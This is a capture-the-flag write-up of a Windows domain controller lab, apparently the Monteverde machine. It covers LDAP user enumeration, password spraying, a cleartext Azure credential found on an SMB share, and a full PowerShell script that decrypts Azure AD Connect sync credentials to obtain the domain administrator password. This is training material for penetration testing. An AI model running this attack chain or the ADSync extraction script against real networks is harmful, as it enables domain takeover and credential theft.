## Enumeration

Performed a nmap scan on 10.129.228.111:

```bash
sudo nmap -sV 10.129.228.111
```

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-24 17:32:08Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows
```

This is a DC. Anonymous SMB authentication reveals the DC's name, MEGABANK.LOCAL. Let's add it to `/etc/hosts`.

---

## LDAP User Enumeration

LDAP anonymous bind allows us to enumerate domain users:

```bash
nxc ldap 10.129.228.111 -u '' -p '' --users
```

```
LDAP   10.129.228.111  389  MONTEVERDE  Guest                         <never>             0  Built-in account for guest access to the computer/domain
LDAP   10.129.228.111  389  MONTEVERDE  AAD_987d7f2f57d2              2020-01-02 17:53:24 0  Service account for the Synchronization Service
LDAP   10.129.228.111  389  MONTEVERDE  mhope                         2020-01-02 18:40:05 0
LDAP   10.129.228.111  389  MONTEVERDE  SABatchJobs                   2020-01-03 07:48:46 0
LDAP   10.129.228.111  389  MONTEVERDE  svc-ata                       2020-01-03 07:58:31 0
LDAP   10.129.228.111  389  MONTEVERDE  svc-bexec                     2020-01-03 07:59:55 0
LDAP   10.129.228.111  389  MONTEVERDE  svc-netapp                    2020-01-03 08:01:42 0
LDAP   10.129.228.111  389  MONTEVERDE  dgalanos                      2020-01-03 08:06:10 0
LDAP   10.129.228.111  389  MONTEVERDE  roleary                       2020-01-03 08:08:05 0
LDAP   10.129.228.111  389  MONTEVERDE  smorgan                       2020-01-03 08:09:21 0
```

---

## Password Spraying

Let's do password spraying using the discovered usernames. The password list includes both common passwords and the usernames themselves (to check for user=password):

**users.txt:**

```
Guest
AAD_987d7f2f57d2
mhope
SABatchJobs
svc-ata
svc-bexec
svc-netapp
dgalanos
roleary
smorgan
```

**passwords.txt:**

```
Guest
AAD_987d7f2f57d2
mhope
SABatchJobs
svc-ata
svc-bexec
svc-netapp
dgalanos
roleary
smorgan
Welcome1
Password1
Password123
P@ssword1
```

```bash
nxc smb 10.129.228.111 -u users.txt -p passwords.txt
```

This reveals a valid credential — the user SABatchJobs has their username as password:

```
SMB  10.129.228.111  445  MONTEVERDE  [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs
```

---

## SMB Enumeration (Authenticated)

Let's list SABatchJobs' shares:

```bash
nxc smb 10.129.228.111 -u SABatchJobs -p SABatchJobs --shares
```

We see an interesting share called `users$`. Let's connect to it:

```bash
smbclient -U SABatchJobs '//10.129.228.111/users$'
```

We find in mhope's directory an interesting file called `azure.xml` (Azure AD credentials). Let's download it with `get` and analyze it:

```xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
    <Props>
      <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
      <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
      <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
      <S N="Password">4n0therD4y@n0th3r$</S>
    </Props>
  </Obj>
</Objs>
```

We find a cleartext password in the XML. Let's validate it against the DC with user mhope:

```bash
nxc smb 10.129.228.111 -u mhope -p '4n0therD4y@n0th3r$'
```

```
SMB  10.129.228.111  445  MONTEVERDE  [+] MEGABANK.LOCAL\mhope:4n0therD4y@n0th3r$
```

---

## User Flag

Let's connect through Evil-WinRM:

```bash
evil-winrm -i 10.129.228.111 -u mhope -p '4n0therD4y@n0th3r$'
```

**User flag** is on mhope's Desktop.

---

## Privilege Escalation — Azure AD Connect

We see that the `.Azure` directory is present in mhope's home directory, indicating Azure AD Connect is installed on this machine. The user mhope is a member of the **Azure Admins** group, which grants access to the Azure AD Sync database (ADSync). This database stores the credentials used to replicate between Azure AD and the on-premise AD — and we can extract them.

We dump the cleartext credentials with this script:

```powershell
$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=LocalHost;Database=ADSync;Trusted_Connection=True;"
$client.Open()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$key_id = $reader.GetInt32(0)
$instance_id = $reader.GetGuid(1)
$entropy = $reader.GetGuid(2)
$reader.Close()

$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()

add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)

$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerXML}}
```

We obtain cleartext credentials:

```
Domain:   MEGABANK.LOCAL
Username: administrator
Password: d0m@in4dminyeah!
```

---

## Root Flag

We connect with Evil-WinRM:

```bash
evil-winrm -i 10.129.228.111 -u Administrator -p 'd0m@in4dminyeah!'
```

**Root flag** is on the Administrator's Desktop.
